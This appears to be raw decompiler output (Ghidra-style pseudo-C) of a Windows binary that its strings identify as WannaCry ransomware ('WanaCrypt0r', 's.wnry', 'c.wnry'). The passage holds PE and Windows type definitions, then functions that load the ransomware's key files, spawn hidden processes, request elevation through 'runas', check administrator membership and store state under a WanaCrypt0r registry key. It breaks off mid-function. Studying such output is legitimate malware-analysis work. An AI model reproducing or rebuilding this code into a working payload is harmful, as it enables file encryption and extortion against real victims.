    struct _EXCEPTION_RECORD * ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD * PEXCEPTION_RECORD;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT * PCONTEXT;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef longlong __time64_t;

typedef uint size_t;

typedef __time64_t time_t;

typedef struct _startupinfo _startupinfo, *P_startupinfo;

struct _startupinfo {
    int newmode;
};

typedef struct tagLOGFONTA tagLOGFONTA, *PtagLOGFONTA;

struct tagLOGFONTA {
    LONG lfHeight;
    LONG lfWidth;
    LONG lfEscapement;
    LONG lfOrientation;
    LONG lfWeight;
    BYTE lfItalic;
    BYTE lfUnderline;
    BYTE lfStrikeOut;
    BYTE lfCharSet;
    BYTE lfOutPrecision;
    BYTE lfClipPrecision;
    BYTE lfQuality;
    BYTE lfPitchAndFamily;
    CHAR lfFaceName[32];
};

typedef struct tagLOGFONTA LOGFONTA;

typedef struct _SID_IDENTIFIER_AUTHORITY _SID_IDENTIFIER_AUTHORITY, *P_SID_IDENTIFIER_AUTHORITY;

typedef struct _SID_IDENTIFIER_AUTHORITY * PSID_IDENTIFIER_AUTHORITY;

struct _SID_IDENTIFIER_AUTHORITY {
    BYTE Value[6];
};

typedef WCHAR * PWSTR;

typedef CHAR * LPCSTR;

typedef LONG * PLONG;

typedef ULARGE_INTEGER * PULARGE_INTEGER;

typedef PVOID PSID;

typedef LARGE_INTEGER * PLARGE_INTEGER;

typedef WORD LANGID;

typedef DWORD LCID;

typedef ULONG_PTR HCRYPTPROV;

typedef struct tagPOINT tagPOINT, *PtagPOINT;

typedef struct tagPOINT * LPPOINT;

struct tagPOINT {
    LONG x;
    LONG y;
};

typedef struct HFONT__ HFONT__, *PHFONT__;

struct HFONT__ {
    int unused;
};

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

struct HBRUSH__ {
    int unused;
};

typedef struct tagSIZE tagSIZE, *PtagSIZE;

struct tagSIZE {
    LONG cx;
    LONG cy;
};

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ * HINSTANCE;

struct HINSTANCE__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef int INT;

typedef struct tagRECT tagRECT, *PtagRECT;

typedef struct tagRECT RECT;

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

typedef int (* FARPROC)(void);

typedef struct HICON__ HICON__, *PHICON__;

struct HICON__ {
    int unused;
};

typedef struct HRGN__ HRGN__, *PHRGN__;

typedef struct HRGN__ * HRGN;

struct HRGN__ {
    int unused;
};

typedef LONG_PTR LRESULT;

typedef struct tagRECT * LPRECT;

typedef BOOL * LPBOOL;

typedef void * HGDIOBJ;

typedef struct HKEY__ * HKEY;

typedef struct HICON__ * HICON;

typedef HICON HCURSOR;

typedef struct HBRUSH__ * HBRUSH;

typedef DWORD COLORREF;

typedef struct HFONT__ * HFONT;
// WARNING! conflicting data type names: /WinDef.h/ULONG - /wtypes.h/ULONG

typedef UINT_PTR WPARAM;

typedef DWORD * LPDWORD;

typedef struct tagSIZE * LPSIZE;

typedef BOOL * PBOOL;

typedef struct _FILETIME * LPFILETIME;

typedef HKEY * PHKEY;

typedef void * LPCVOID;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct Var Var, *PVar;

struct Var {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct StringFileInfo StringFileInfo, *PStringFileInfo;

struct StringFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct StringTable StringTable, *PStringTable;

struct StringTable {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_WRITE=2147483648,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_TYPE_NO_PAD=8
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct VS_VERSION_INFO VS_VERSION_INFO, *PVS_VERSION_INFO;

struct VS_VERSION_INFO {
    word StructLength;
    word ValueLength;
    word StructType;
    wchar16 Info[16];
    byte Padding[2];
    dword Signature;
    word StructVersion[2];
    word FileVersion[4];
    word ProductVersion[4];
    dword FileFlagsMask[2];
    dword FileFlags;
    dword FileOS;
    dword FileType;
    dword FileSubtype;
    dword FileTimestamp;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct VarFileInfo VarFileInfo, *PVarFileInfo;

struct VarFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct StringInfo StringInfo, *PStringInfo;

struct StringInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef LONG LSTATUS;

typedef struct _SHELLEXECUTEINFOA _SHELLEXECUTEINFOA, *P_SHELLEXECUTEINFOA;

typedef union _union_1206 _union_1206, *P_union_1206;

union _union_1206 {
    HANDLE hIcon;
};

struct _SHELLEXECUTEINFOA {
    DWORD cbSize;
    ULONG fMask;
    HWND hwnd;
    LPCSTR lpVerb;
    LPCSTR lpFile;
    LPCSTR lpParameters;
    LPCSTR lpDirectory;
    int nShow;
    HINSTANCE hInstApp;
    void * lpIDList;
    LPCSTR lpClass;
    HKEY hkeyClass;
    DWORD dwHotKey;
    union _union_1206 u;
    HANDLE hProcess;
};

typedef struct _SHELLEXECUTEINFOA SHELLEXECUTEINFOA;

typedef struct IUnknown * LPUNKNOWN;

undefined4 * __thiscall FUN_00401000(void *this,CWnd *param_1) {
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00413458;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  CDialog((CDialog *)this,0x8d,param_1);
  local_4 = 0;
  CWnd((CWnd *)(undefined4 *)((int)this + 0x60));
  *(undefined4 *)((int)this + 0x60) = 0x4157f0;
  *(undefined4 *)this = 0x415718;
  *(undefined4 *)((int)this + 0xb4) = 0;
  *(undefined4 *)((int)this + 0xa0) = 1;
  *(undefined4 *)((int)this + 0xac) = 0;
  *(undefined4 *)((int)this + 0xa4) = 0;
  *in_FS_OFFSET = local_c;
  return (undefined4 *)this;
}

void FUN_00401080(void) {
  return;
}

CDialog * __thiscall FUN_004010a0(void *this,byte param_1) {
  FUN_004010c0((CDialog *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CDialog *)this;
}

void __fastcall FUN_004010c0(CDialog *param_1) {
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_00413478;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  local_4 = 0;
  _CProgressCtrl((CProgressCtrl *)(param_1 + 0x60));
  local_4 = 0xffffffff;
  _CDialog(param_1);
  *in_FS_OFFSET = local_c;
  return;
}

void __fastcall FUN_004012e0(int param_1) {
  DWORD DVar1;
  int iVar2;
  FILE *_File;
  WPARAM WVar3;
  int iVar4;
  undefined4 *puVar5;
  undefined4 *in_FS_OFFSET;
  CHAR local_9ec [32];
  undefined4 local_9cc [10];
  CHAR local_9a4 [32];
  undefined4 local_984 [10];
  char local_95c [32];
  char local_93c [32];
  undefined4 local_91c;
  undefined4 local_918 [33];
  undefined4 local_894;
  undefined4 local_890 [33];
  undefined local_80c;
  undefined4 local_80b;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_c = *in_FS_OFFSET;
  local_4 = 0xffffffff;
  puStack8 = &DAT_004134a6;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  iVar4 = DAT_0042189c;
  sprintf(local_9a4,s__08X_pky_0041fb94,*(undefined4 *)(param_1 + 0xa4));
  sprintf(local_9ec,s__08X_dky_0041fb88,*(undefined4 *)(param_1 + 0xa4));
  DVar1 = GetFileAttributesA(local_9ec);
  if (DVar1 == 0xffffffff) {
LAB_004013b0:
    iVar2 = 0x21;
    local_894 = 0;
    puVar5 = local_890;
    while (iVar2 != 0) {
      iVar2 = iVar2 + -1;
      *puVar5 = 0;
      puVar5 = puVar5 + 1;
    }
    _File = fopen(s_00000000_res_0041fb74,(char *)&_Mode_0041fb84);
    if (_File == (FILE *)0x0) {
      *(undefined4 *)(param_1 + 0xa8) = 0xffffffff;
      goto LAB_004015d8;
    }
    fread(&local_894,0x88,1,_File);
    fclose(_File);
    iVar2 = 0x21;
    local_91c = 0;
    puVar5 = local_918;
    while (iVar2 != 0) {
      iVar2 = iVar2 + -1;
      *puVar5 = 0;
      puVar5 = puVar5 + 1;
    }
    sprintf(local_93c,s__08X_res_0041fb68,*(undefined4 *)(param_1 + 0xa4));
    _File = fopen(local_93c,(char *)&_Mode_0041fb84);
    if (_File == (FILE *)0x0) {
      *(undefined4 *)(param_1 + 0xa8) = 0xffffffff;
      goto LAB_004015d8;
    }
    fread(&local_91c,0x88,1,_File);
    fclose(_File);
    iVar2 = 0x1ff;
    local_80c = this_00421798._0_1_;
    puVar5 = &local_80b;
    while (iVar2 != 0) {
      iVar2 = iVar2 + -1;
      *puVar5 = 0;
      puVar5 = puVar5 + 1;
    }
    *(undefined2 *)puVar5 = 0;
    *(undefined *)((int)puVar5 + 2) = 0;
    sprintf(local_95c,s__08X_eky_0041fb5c,*(undefined4 *)(param_1 + 0xa4));
    _File = fopen(local_95c,(char *)&_Mode_0041fb84);
    if (_File == (FILE *)0x0) {
      *(undefined4 *)(param_1 + 0xa8) = 0xffffffff;
      goto LAB_004015d8;
    }
    fread(&local_80c,1,0x800,_File);
    fclose(_File);
    FUN_0040be90(s_s_wnry_0041fb54,(char *)(iVar4 + 0x6ea),(char *)(iVar4 + 0x74e));
    WVar3 = FUN_0040c240();
    FUN_0040c670();
    if ((int)WVar3 < 0) goto LAB_004015d8;
    FUN_00404640(local_984);
    local_4 = 1;
    iVar4 = FUN_004047c0(local_984,local_9a4,local_9ec);
    if (iVar4 == 0) {
      *(undefined4 *)(param_1 + 0xa8) = 1;
    }
    else {
      *(undefined4 *)(param_1 + 0xa8) = 2;
    }
    puVar5 = local_984;
  }
  else {
    FUN_00404640(local_9cc);
    local_4 = 0;
    iVar2 = FUN_004047c0(local_9cc,local_9a4,local_9ec);
    if (iVar2 == 0) {
      DeleteFileA(local_9ec);
      local_4 = 0xffffffff;
      FUN_00404690(local_9cc);
      goto LAB_004013b0;
    }
    *(undefined4 *)(param_1 + 0xa8) = 2;
    puVar5 = local_9cc;
  }
  local_4 = 0xffffffff;
  FUN_00404690(puVar5);
LAB_004015d8:
  *in_FS_OFFSET = local_c;
  return;
}

void __thiscall FUN_00401970(void *this,char *param_1) {
  CWnd *this_00;
  undefined4 *in_FS_OFFSET;
  char *pcVar1;
  undefined4 local_c;
  char **ppcStack8;
  undefined4 local_4;
  
  local_c = *in_FS_OFFSET;
  ppcStack8 = &param_1_004134d8;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  local_4 = 0;
  pcVar1 = param_1;
  this_00 = GetDlgItem((CWnd *)this,0x406);
  SetWindowTextA(this_00,pcVar1);
  local_4 = 0xffffffff;
  _CString((CString *)&param_1);
  *in_FS_OFFSET = local_c;
  return;
}

CProgressCtrl * __thiscall FUN_004019f0(void *this,byte param_1) {
  _CProgressCtrl((CProgressCtrl *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CProgressCtrl *)this;
}

undefined4 __cdecl FUN_00401a10(void *param_1,int param_2) {
  FILE *_File;
  size_t sVar1;
  char **_Mode;
  
  if (param_2 == 0) {
    _Mode = &_Mode_0041fda8;
  }
  else {
    _Mode = &_Mode_0041fb84;
  }
  _File = fopen(s_c_wnry_0041fda0,(char *)_Mode);
  if (_File != (FILE *)0x0) {
    if (param_2 == 0) {
      sVar1 = fwrite(param_1,0x30c,1,_File);
    }
    else {
      sVar1 = fread(param_1,0x30c,1,_File);
    }
    if (sVar1 != 0) {
      fclose(_File);
      return 1;
    }
    fclose(_File);
  }
  return 0;
}

undefined4 __cdecl FUN_00401a90(LPSTR param_1,DWORD param_2,LPDWORD param_3) {
  BOOL BVar1;
  DWORD DVar2;
  int iVar3;
  LPSTR *ppCVar4;
  _PROCESS_INFORMATION local_54;
  _STARTUPINFOA local_44;
  
  iVar3 = 0x10;
  local_44.cb = 0x44;
  ppCVar4 = &local_44.lpReserved;
  while (iVar3 != 0) {
    iVar3 = iVar3 + -1;
    *ppCVar4 = (LPSTR)0x0;
    ppCVar4 = ppCVar4 + 1;
  }
  local_54.hThread = (HANDLE)0x0;
  local_54.dwProcessId = 0;
  local_54.dwThreadId = 0;
  local_54.hProcess = (HANDLE)0x0;
  local_44.dwFlags = 1;
  local_44.wShowWindow = 0;
  BVar1 = CreateProcessA((LPCSTR)0x0,param_1,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0
                         ,0x8000000,(LPVOID)0x0,(LPCSTR)0x0,(LPSTARTUPINFOA)&local_44,
                         (LPPROCESS_INFORMATION)&local_54);
  if (BVar1 != 0) {
    if (param_2 != 0) {
      DVar2 = WaitForSingleObject(local_54.hProcess,param_2);
      if (DVar2 != 0) {
        TerminateProcess(local_54.hProcess,0xffffffff);
      }
      if (param_3 != (LPDWORD)0x0) {
        GetExitCodeProcess(local_54.hProcess,param_3);
      }
    }
    CloseHandle(local_54.hProcess);
    CloseHandle(local_54.hThread);
    return 1;
  }
  return 0;
}

uint __cdecl FUN_00401b50(LPCSTR param_1,LPCSTR param_2,int param_3) {
  BOOL BVar1;
  int iVar2;
  ULONG *pUVar3;
  SHELLEXECUTEINFOA local_3c;
  
  iVar2 = 0xe;
  pUVar3 = &local_3c.fMask;
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *pUVar3 = 0;
    pUVar3 = pUVar3 + 1;
  }
  local_3c.fMask = 0;
  local_3c.lpDirectory = (LPCSTR)0x0;
  local_3c.lpFile = param_1;
  local_3c.nShow = -(uint)(param_3 != 0) & 5;
  local_3c.cbSize = 0x3c;
  local_3c.lpParameters = param_2;
  local_3c.lpVerb = s_runas_0041fdac;
  BVar1 = ShellExecuteExA(&local_3c);
  return (uint)(BVar1 == 1);
}

BOOL FUN_00401bb0(void) {
  BOOL BVar1;
  BOOL local_10;
  PSID local_c;
  _SID_IDENTIFIER_AUTHORITY local_8;
  
  local_8.Value[0] = '\0';
  local_8.Value[1] = '\0';
  local_8.Value[2] = '\0';
  local_8.Value[3] = '\0';
  local_8.Value[4] = '\0';
  local_8.Value[5] = '\x05';
  local_10 = 0;
  BVar1 = AllocateAndInitializeSid
                    ((PSID_IDENTIFIER_AUTHORITY)&local_8,'\x02',0x20,0x220,0,0,0,0,0,0,&local_c);
  if (BVar1 == 0) {
    return 0;
  }
  BVar1 = CheckTokenMembership((HANDLE)0x0,local_c,&local_10);
  if (BVar1 == 0) {
    local_10 = 0;
  }
  FreeSid(local_c);
  return local_10;
}

undefined4 * __cdecl FUN_00401c30(undefined4 param_1,undefined4 *param_2) {
  char cVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  char *pcVar5;
  char *pcVar6;
  undefined4 *puVar7;
  
  *(undefined *)param_2 = 0;
  pcVar5 = (char *)Ordinal_12(param_1);
  uVar2 = 0xffffffff;
  do {
    pcVar6 = pcVar5;
    if (uVar2 == 0) break;
    uVar2 = uVar2 - 1;
    pcVar6 = pcVar5 + 1;
    cVar1 = *pcVar5;
    pcVar5 = pcVar6;
  } while (cVar1 != '\0');
  uVar2 = ~uVar2;
  uVar3 = uVar2 >> 2;
  puVar4 = (undefined4 *)(pcVar6 + -uVar2);
  puVar7 = param_2;
  while (uVar3 != 0) {
    uVar3 = uVar3 - 1;
    *puVar7 = *puVar4;
    puVar4 = puVar4 + 1;
    puVar7 = puVar7 + 1;
  }
  uVar2 = uVar2 & 3;
  while (uVar2 != 0) {
    uVar2 = uVar2 - 1;
    *(undefined *)puVar7 = *(undefined *)puVar4;
    puVar4 = (undefined4 *)((int)puVar4 + 1);
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  }
  return param_2;
}

undefined4 __cdecl FUN_00401c70(int param_1) {
  BYTE BVar1;
  LSTATUS LVar2;
  int iVar3;
  uint uVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  BYTE *pBVar7;
  DWORD DVar8;
  bool bVar9;
  HKEY hKey;
  HKEY local_2d8;
  DWORD local_2d4;
  undefined4 local_2d0 [5];
  undefined4 local_2bc [45];
  BYTE local_208;
  undefined4 local_207;
  
  iVar3 = 5;
  puVar5 = (undefined4 *)u_Software__0041fde0;
  puVar6 = local_2d0;
  while (iVar3 != 0) {
    iVar3 = iVar3 + -1;
    *puVar6 = *puVar5;
    puVar5 = puVar5 + 1;
    puVar6 = puVar6 + 1;
  }
  iVar3 = 0x2d;
  puVar5 = local_2bc;
  while (iVar3 != 0) {
    iVar3 = iVar3 + -1;
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  iVar3 = 0x81;
  local_208 = '\0';
  puVar5 = &local_207;
  while (iVar3 != 0) {
    iVar3 = iVar3 + -1;
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  *(undefined *)((int)puVar5 + 2) = 0;
  local_2d8 = (HKEY)0x0;
  wcscat((wchar_t *)local_2d0,u_WanaCrypt0r_0041fdc8);
  local_2d4 = 0;
  do {
    DVar8 = local_2d4;
    if (local_2d4 == 0) {
      hKey = (HKEY)0x80000002;
    }
    else {
      hKey = (HKEY)0x80000001;
    }
    RegCreateKeyW(hKey,(LPCWSTR)local_2d0,(PHKEY)&local_2d8);
    if (local_2d8 != (HKEY)0x0) {
      if (param_1 == 0) {
        local_2d4 = 0x207;
        LVar2 = RegQueryValueExA(local_2d8,(LPCSTR)&lpValueName_0041fdc4,(LPDWORD)0x0,(LPDWORD)0x0,
                                 &local_208,&local_2d4);
        bVar9 = LVar2 == 0;
        if (bVar9) {
          SetCurrentDirectoryA((LPCSTR)&local_208);
        }
      }
      else {
        GetCurrentDirectoryA(0x207,(LPSTR)&local_208);
        uVar4 = 0xffffffff;
        pBVar7 = &local_208;
        do {
          if (uVar4 == 0) break;
          uVar4 = uVar4 - 1;
          BVar1 = *pBVar7;
          pBVar7 = pBVar7 + 1;
        } while (BVar1 != '\0');
        LVar2 = RegSetValueExA(local_2d8,(LPCSTR)&lpValueName_0041fdc4,0,1,&local_208,~uVar4);
        bVar9 = LVar2 == 0;
        DVar8 = local_2d4;
      }
      RegCloseKey(local_2d8);
      if (bVar9) {
        return 1;
      }
    }
    local_2d4 = DVar8 + 1;
    if (1 < (int)local_2d4) {
      return 0;
    }
  } while( true );
}

char * __cdecl FUN_00401de0(ushort *param_1,char *param_2) {
  sprintf(param_2,s__04d__02d__02d__02d__02d__02d_0041fdf4,(uint)*param_1,(uint)param_1[1],
          (uint)param_1[3],(uint)param_1[4],(uint)param_1[5],(uint)param_1[6]);
  return param_2;
}

void __cdecl FUN_00401e30(int param_1,char *param_2) {
  ushort local_10 [8];
  
  FUN_00401e60(param_1,local_10);
  FUN_00401de0(local_10,param_2);
  return;
}

void __cdecl FUN_00401e60(int param_1,undefined4 param_2) {
  Ordinal_185((double)param_1 * 0.00001157 + 25569.00000000,param_2);
  return;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 * __fastcall FUN_00401e90(undefined4 *param_1) {
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00413506;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  FUN_00404640(param_1 + 1);
  local_4 = 0;
  FUN_00404640(param_1 + 0xb);
  local_4 = CONCAT31(local_4._1_3_,1);
  FUN_0040a110(param_1 + 0x15);
  param_1[0x132] = 0;
  param_1[0x133] = 0;
  param_1[0x134] = 0;
  param_1[0x135] = 0;
  *param_1 = 0x4158c0;
  *in_FS_OFFSET = local_c;
  return param_1;
}

undefined4 * __thiscall FUN_00401f10(void *this,byte param_1) {
  FUN_00401f30((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

// WARNING: Could not reconcile some variable overlaps

void __fastcall FUN_00401f30(undefined4 *param_1) {
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_00413531;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x4158c0;
  local_4 = 2;
  FUN_00401fa0((int)param_1);
  local_4._0_1_ = 1;
  FUN_0040a140(param_1 + 0x15);
  local_4 = (uint)local_4._1_3_ << 8;
  FUN_00404690(param_1 + 0xb);
  local_4 = 0xffffffff;
  FUN_00404690(param_1 + 1);
  *in_FS_OFFSET = local_c;
  return;
}

undefined4 __fastcall FUN_00401fa0(int param_1) {
  undefined *puVar1;
  int iVar2;
  
  FUN_00404770(param_1 + 4);
  FUN_00404770(param_1 + 0x2c);
  puVar1 = *(undefined **)(param_1 + 0x4c8);
  if (puVar1 != (undefined *)0x0) {
    iVar2 = 0x100000;
    do {
      *puVar1 = 0;
      puVar1 = puVar1 + 1;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
    GlobalFree(*(HGLOBAL *)(param_1 + 0x4c8));
    *(undefined4 *)(param_1 + 0x4c8) = 0;
  }
  puVar1 = *(undefined **)(param_1 + 0x4cc);
  if (puVar1 != (undefined *)0x0) {
    iVar2 = 0x100000;
    do {
      *puVar1 = 0;
      puVar1 = puVar1 + 1;
      iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
    GlobalFree(*(HGLOBAL *)(param_1 + 0x4cc));
    *(undefined4 *)(param_1 + 0x4cc) = 0;
  }
  return 1;
}

undefined4 __thiscall FUN_00402020(void *this,LPCSTR param_1,undefined4 param_2,undefined4 param_3) {
  int iVar1;
  HGLOBAL pvVar2;
  
  iVar1 = FUN_004046f0((void *)((int)this + 4),param_1);
  if (iVar1 == 0) {
    return 0;
  }
  if (param_1 != (LPCSTR)0x0) {
    FUN_004046f0((void *)((int)this + 0x2c),(LPCSTR)0x0);
  }
  pvVar2 = GlobalAlloc(0,0x100000);
  *(HGLOBAL *)((int)this + 0x4c8) = pvVar2;
  if (pvVar2 == (HGLOBAL)0x0) {
    return 0;
  }
  pvVar2 = GlobalAlloc(0,0x100000);
  *(HGLOBAL *)((int)this + 0x4cc) = pvVar2;
  if (pvVar2 == (HGLOBAL)0x0) {
    return 0;
  }
  *(undefined4 *)((int)this + 0x4d4) = param_2;
  *(undefined4 *)((int)this + 0x4d0) = param_3;
  return 1;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __thiscall FUN_004020a0(void *this,undefined4 param_1,undefined4 param_2) {
  int iVar1;
  HANDLE hFile;
  int *piVar2;
  int *piVar3;
  undefined4 *in_FS_OFFSET;
  bool bVar4;
  HANDLE hFile_00;
  int local_268;
  int local_264;
  HANDLE local_260;
  FILETIME local_25c;
  FILETIME local_254;
  FILETIME local_24c;
  undefined local_244 [5];
  undefined2 local_23f;
  undefined local_23d;
  uint local_23c;
  int local_238;
  undefined4 local_234;
  undefined4 local_230 [128];
  int local_30;
  uint local_2c;
  int local_28;
  uint local_24;
  uint local_20 [3];
  undefined4 local_14;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 local_8;
  
